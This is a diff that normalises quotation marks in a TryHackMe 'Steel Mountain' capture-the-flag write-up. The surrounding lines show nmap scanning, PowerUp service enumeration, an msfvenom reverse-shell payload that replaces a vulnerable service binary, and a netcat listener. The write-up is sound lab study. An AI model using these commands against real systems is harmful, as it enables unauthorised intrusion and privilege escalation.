@@ -7,13 +7,13 @@ date:: 2021-11-07
 
 ### Introduction
 
-Apparently this machine is running a web server. (Though I never would have guest that without first searching for a walkthrough of this TryHackMe room, as my initial response was, “how the hell do I know who the employee of the month is based on the IP of a Windows machine I can’t yet log into?”)
+Apparently this machine is running a web server. (Though I never would have guest that without first searching for a walkthrough of this TryHackMe room, as my initial response was, "how the hell do I know who the employee of the month is based on the IP of a Windows machine I can't yet log into?")
 
 The machine IP address for this exercise is 10.10.241.108.
 
 ### Initial Access
 
-NMAP command line (note that we skip the ping test, since Windows machines don’t respond to ping by default, and because the introduction told us that this machine wouldn’t respond to ping):
+NMAP command line (note that we skip the ping test, since Windows machines don't respond to ping by default, and because the introduction told us that this machine wouldn't respond to ping):
 
 ```bash
 sudo nmap -v -oA steel-mountain -A -Pn -sS \
@@ -176,11 +176,11 @@ NOTES TO SELF:
 
 I lost a good hour getting stuck because of these two minor complications.
 
-* [Using “nmap”](../notes/nmap.md)
+* [Using "nmap"](../notes/nmap.md)
 
 ### Privilege Escalation
 
-PowerUp is a script that scans for common Windows vulnerabilities. It looks like the version that’s included with Kali Linux is different and/or not-up-to-date relative to the version of PowerUp linked to by the TryHackMe Steelmountain room. In particular, Kali version doesn’t list *a lot* of information about potentially vulnerable services that is necessary for completing this section. (On the downside, the version of PowerUp we need to use produces *a lot* of duplicative output too…)
+PowerUp is a script that scans for common Windows vulnerabilities. It looks like the version that's included with Kali Linux is different and/or not-up-to-date relative to the version of PowerUp linked to by the TryHackMe Steelmountain room. In particular, Kali version doesn't list *a lot* of information about potentially vulnerable services that is necessary for completing this section. (On the downside, the version of PowerUp we need to use produces *a lot* of duplicative output too...)
 
 Anyways, first we have to download the more capable version of PowerUp:
 
@@ -218,7 +218,7 @@ msfvenom -p windows/shell_reverse_tcp \
 
 (The reason we need to specify an encoder here is because the vulnerable binary is in Program Files (x86), so we need to produce an x86 binary rather than the default x86_64 binary.)
 
-To upload this, we’ll need to background PowerShell with `^Z`. (*Don’t* try to exit — for me this caused hangs, and I eventually had to restart the machine!) Upload and then start a new shell:
+To upload this, we'll need to background PowerShell with `^Z`. (*Don't* try to exit - for me this caused hangs, and I eventually had to restart the machine!) Upload and then start a new shell:
 
 ```meterpreter
 upload /home/kali/ASCService.exe
@@ -234,7 +234,7 @@ cp -force ASCService.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCSe
 Start-Service -Name AdvancedSystemCareService9
 ```
 
-(We can run Stop-Service and Start-Service because the user we’ve compromised has the CanRestart permission for this service.)
+(We can run Stop-Service and Start-Service because the user we've compromised has the CanRestart permission for this service.)
 
 Catch this reverse shell using netcat:
 
@@ -242,7 +242,7 @@ Catch this reverse shell using netcat:
 nc -lvnp 4443
 ```
 
-Once we have the root flag, let’s put the service back the way it was before we try the non-Metasploit version of this.
+Once we have the root flag, let's put the service back the way it was before we try the non-Metasploit version of this.
 
 ```powershell
 Stop-Service -Name AdvancedSystemCareService9
@@ -251,4 +251,4 @@ Start-Service -Name AdvancedSystemCareService9
 ```
 
 * [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
-* [Using “netcat”](../notes/netcat.md)
+* [Using "netcat"](../notes/netcat.md)
